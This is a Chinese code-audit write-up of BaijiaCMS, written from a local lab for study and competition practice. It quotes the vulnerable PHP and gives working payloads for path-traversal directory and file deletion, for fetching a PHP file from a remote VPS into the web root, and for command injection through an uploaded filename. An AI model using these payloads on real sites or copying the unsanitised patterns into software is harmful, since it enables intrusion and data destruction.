# 前言

虽然现在PHP江河日下,但是在一些比赛中对CMS的审计还是有必要的,所以还是来熟悉熟悉代码审计,看到百家CMS的代码不算很难就跟着审计来看看

# 环境搭建

https://gitee.com/openbaijia/baijiacms.git

直接方法进行安装

设置管理员账号密码admin,admin

![image-20220203161732817](images/1.png)

如果不行就自己创建一个baijiacms数据库

# 代码审计

seay扫了286个漏洞出来,有很多是误报

![image-20220203163745161](images/2.png)

## 任意目录删除

### 利用条件

- 需要管理权限
- 只能删除目录

### 代码分析

跟进第15条/includes/baijiacms/common.inc.php

从520行到547行

```
function rmdirs($path='',$isdir=false)
{
       if(is_dir($path))
       {
               $file_list= scandir($path);
               foreach ($file_list as $file)
               {
                   if( $file!='.' && $file!='..')
                   {
                         if($file!='qrcode')
                         {
                       rmdirs($path.'/'.$file,true);
                     }
                   }
               }
               
          if($path!=WEB_ROOT.'/cache/')
          {
               @rmdir($path);   #删除目录
                  
         }    
       }
       else
       {
           @unlink($path); 
       }
    
}
```

判断是否是一个目录,如果是一个文件的话进入else分支直接删除文件，如果是一个目录的话，会对其中非`.`,`..`,`qrcode`文件进行删除,退出来后判断是否是cache目录,如果不是直接删除目录

而$path是传进来的参数,如果可控那就可以实现任意文件删除了,看看哪些地方调用了这个rmdirs函数的

![image-20220203233756686](images/3.png)

定位到system/manager/class/web/database.php

```
if ($operation == 'delete') {
    $d = base64_decode($_GP['id']);

    $path = WEB_ROOT . '/config/data_backup/';
    if (is_dir($path . $d)) {
        rmdirs($path . $d);
        message('备份删除成功！', create_url('site', array('act' => 'manager', 'do' => 'database', 'op' => 'restore')), 'success');
    }
}
```

rmdirs传进去的参数是`$path`和`$d`拼接的字符,继续去看`$d`是怎么来的

```
$d = base64_decode($_GP['id']);
```

看看$_GP是什么

![image-20220203234100735](images/4.png)

就是几种传参方式的集合,那这里`$d`就是可控的了,这样就能实现对任意文件的删除了,但是具体怎么利用呢

### 漏洞利用

从database.php中的代码可以看出来这应该是删除备份文件的功能

在后台管理界面中找到功能点

![image-20220203234505361](images/5.png)

在根目录下重新创建一个TEST目录

![image-20220203234606437](images/6.png)

然后删除备份,抓包,修改这个id参数的值为`../../TEST`的base64值Li4vLi4vVEVTVA==

![image-20220203234837856](images/7.png)

删除成功

![image-20220203234953310](images/8.png)

## 任意文件删除

### 利用条件

- 不需要管理员权限
- 只能删除文件

### 代码分析

关键代码/system/eshop/core/mobile/util/uploader.php

```
       if (function_exists('file_remote_upload')) {
         $remote = file_remote_upload($file['path']);
         if (is_error($remote)) {
            $result['message'] = $remote['message'];
            exit(json_encode($result));
         }
      }
      $result['status'] = 'success';
      $result['url'] = $file['url'];
      $result['error'] = 0;
      $result['filename'] = $file['path'];
      $result['url'] = ATTACHMENT_ROOT.$result['filename'];
      pdo_insert('core_attachment', array('uniacid' => $_W['uniacid'], 'uid' => $_W['member']['uid'], 'filename' => $_FILES[$field]['name'], 'attachment' => $result['filename'], 'type' => 1, 'createtime' => TIMESTAMP,));
      exit(json_encode($result));
   } else {
      $result['message'] = '请选择要上传的图片！';
      exit(json_encode($result));
   }
} elseif ($operation == 'remove') {
    $file = $_GPC['file'];
    file_delete($file);
    show_json(1);
}
```

注意到elseif,如下图可以看到$operation可控

![image-20220207001016932](images/9.png)

![image-20220207001029991](images/10.png)

![image-20220207001042630](images/11.png)

并且$file也只是通过GET或者POST提交的一个参数

跟进file_delete方法

```
function file_delete($file_relative_path)
{

    if (empty($file_relative_path)) {
        return true;
    }

    $settings = globaSystemSetting();
    if (!empty($settings['system_isnetattach'])) {
        if ($settings['system_isnetattach'] == 1) {
            require_once(WEB_ROOT . '/includes/lib/lib_ftp.php');
            $ftp = new baijiacms_ftp();
            if (true === $ftp->connect()) {
                if ($ftp->ftp_delete($settings['system_ftp_ftproot'] . $file_relative_path)) {
                    return true;
                } else {
                    return false;
                }
            } else {
                return false;
            }
        }
        if ($settings['system_isnetattach'] == 1) {
            require_once(WEB_ROOT . '/includes/lib/lib_oss.php');
            $oss = new baijiacms_oss();
            $oss->deletefile($file_relative_path);
            return true;
        }
    } else {
        if (is_file(SYSTEM_WEBROOT . '/attachment/' . $file_relative_path)) {
            unlink(SYSTEM_WEBROOT . '/attachment/' . $file_relative_path);
            return true;
        }

    }
    return true;
}
```

传进来的参数是可控的,只要进到这个else那就可以unlink删除任意文件了

### 漏洞利用

这里的漏洞利用只能直接用payload进行利用了

```
http://127.0.0.1/baijiacms-master/index.php?mod=mobile&act=uploader&op=post&do=util&m=eshop&op=remove&file=../test.txt
```

在网站根目录下创建test.txt，直接用payload打即可删除文件

如果没有删除可以考虑在改界面将远程附件改为本地`$settings['system_isnetattach']`是远程附件

![image-20220207002035971](images/12.png)

## 远程文件上传漏洞

### 利用条件

- 需要管理员权限
- 需要远程靶机上有文件

### 代码分析

system/public/class/web/file.php

```
if ($do == 'fetch') {
    $url = trim($_GPC['url']);
    $file = fetch_net_file_upload($url);
    if (is_error($file)) {
        $result['message'] = $file['message'];
        die(json_encode($result));
    }

}
```

和之前一样,$_GPC就是用GET和POST传参即可,trim去除空白字符,跟进fetch_net_file_upload

```
function fetch_net_file_upload($url)
{
    $url = trim($url);


    $extention = pathinfo($url, PATHINFO_EXTENSION);
    $path = '/attachment/';
    $extpath = "{$extention}/" . date('Y/m/');

    mkdirs(WEB_ROOT . $path . $extpath);
    do {
        $filename = random(15) . ".{$extention}";
    } while (is_file(SYSTEM_WEBROOT . $path . $extpath . $filename));


    $file_tmp_name = SYSTEM_WEBROOT . $path . $extpath . $filename;
    $file_relative_path = $extpath . $filename;
    if (file_put_contents($file_tmp_name, file_get_contents($url)) == false) {
        $result['message'] = '提取失败.';
        return $result;
    }
    $file_full_path = WEB_ROOT . $path . $extpath . $filename;
    return file_save($file_tmp_name, $filename, $extention, $file_full_path, $file_relative_path);
}
```

pathinfo以数组格式返回文件路径信息,这里只返回了文件的拓展名extension

然后拼接一个年月日期作为新的路径,mkdirs创建路径

接下来使用随机数和拓张名拼接生成新的文件名

然后在if判断这里写入文件,文件名是刚才信息拼接而成的,文件内容是$url也就是远程文件里面读出来的

最后使用return返回文件的路径信息

### 漏洞利用

还是直接拿payload打

我的vps上创建一个test.php

![image-20220207005247332](images/13.png)

```
http://127.0.0.1/baijiacms-master/index.php?mod=web&do=file&m=public&op=fetch&url=http://远程IP/test.php
```

![image-20220207005259817](images/14.png)

注意这里vps上的文件最好不用用数字,我用1.php就没有返回文件名

![image-20220207005334912](images/15.png)

写入成功

## 远程命令执行漏洞

### 利用条件

- 需要后台权限

### 代码分析

关键代码

```
function file_save($file_tmp_name, $filename, $extention, $file_full_path, $file_relative_path, $allownet = true)
{

    $settings = globaSystemSetting();

    if (!file_move($file_tmp_name, $file_full_path)) {
        return error(-1, '保存上传文件失败');
    }
    if (!empty($settings['image_compress_openscale'])) {

        $scal = $settings['image_compress_scale'];
        $quality_command = '';
        if (intval($scal) > 0) {
            $quality_command = ' -quality ' . intval($scal);
        }
        system('convert' . $quality_command . ' ' . $file_full_path . ' ' . $file_full_path);
    }
```

在file_save这个函数中有一个命令执行模块,但是要满足if判断

`$settings['image_compress_openscale']`是附件设置中的图片压缩功能是否开启

![image-20220207010107843](images/16.png)

在system中这几个拼接的变量并没有进行过滤,如果可控的话就可以通过分隔符执行命令了

特别是是$file_full_path是调用改函数的时候传进来的

找到调用点

关键代码system/weixin/class/web/setting.php

```
        $extention = pathinfo($file['name'], PATHINFO_EXTENSION);
        $extention = strtolower($extention);
        if ($extention == 'txt') {
            $substr = substr($_SERVER['PHP_SELF'], 0, strrpos($_SERVER['PHP_SELF'], '/'));
            if (empty($substr)) {
                $substr = "/";
            }
            $verify_root = substr(WEB_ROOT . "/", 0, strrpos(WEB_ROOT . "/", $substr)) . "/";

            //file_save($file['tmp_name'],$file['name'],$extention,$verify_root.$file['name'],$verify_root.$file['name'],false);
            file_save($file['tmp_name'], $file['name'], $extention, WEB_ROOT . "/" . $file['name'], WEB_ROOT . "/" . $file['name'], false);

            if ($verify_root != WEB_ROOT . "/") {
                copy(WEB_ROOT . "/" . $file['name'], $verify_root . "/" . $file['name']);
            }

            $cfg['weixin_hasverify'] = $file['name'];
        } else {
            message("不允许上传除txt结尾以外的文件");
        }
```

函数用pathinfo截取了后缀名,进行判断,如果后缀为txt就进入if调用file_save

![image-20220207010942913](images/17.png)

这个`$file['name']`是来自一个上传文件的名称，那就是可控的了

在微信认证页面,直接没找到

```
http://127.0.0.1/baijiacms-master/index.php?mod=site&act=weixin&do=setting&beid=1
```

### 漏洞利用

首先开启图片压缩选项,记得点提交才能修改

![image-20220207011150328](images/18.png)

接下来创建一个名称为命令的txt文件记得加上命令分隔符

![image-20220207011252057](images/19.png)

上传

![image-20220207011335389](images/20.png)

命令执行成功

![image-20220207011349618](images/21.png)



# 写在最后

对CMS的审计还是需要借助一些工具,但是后续应该还是要去找更方便的工具来减少误报

除此之外,在找到一些漏洞点后不知道怎么去利用也是一个很大的问题,要去找到怎么触发这个漏洞,需要什么URL才能利用到有漏洞的这个文件去触发,这都是需要解决的大问题,不然你有了审计漏洞的能力但是无法触发也无济于事



参考链接

https://blog.csdn.net/weixin_45669205/article/details/119803985

https://xz.aliyun.com/t/9955#toc-12
